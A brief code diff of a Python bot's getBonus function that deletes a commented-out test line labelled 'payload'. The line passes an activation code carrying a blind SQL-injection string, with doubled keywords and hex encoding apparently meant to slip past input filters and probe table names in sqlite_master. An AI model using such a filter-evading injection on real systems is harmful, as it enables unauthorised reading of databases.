@@ -65,6 +65,3 @@ def getBonus(qq, ActivationCode):
         return dict(reply='%s' % message)
 
 
-# payload
-# print(getBonus(54315368,
-#               "76637777  oorr ((select name from sqlite_master where hex(type)='7461626c65' limit 0,1) like 'US%')"))
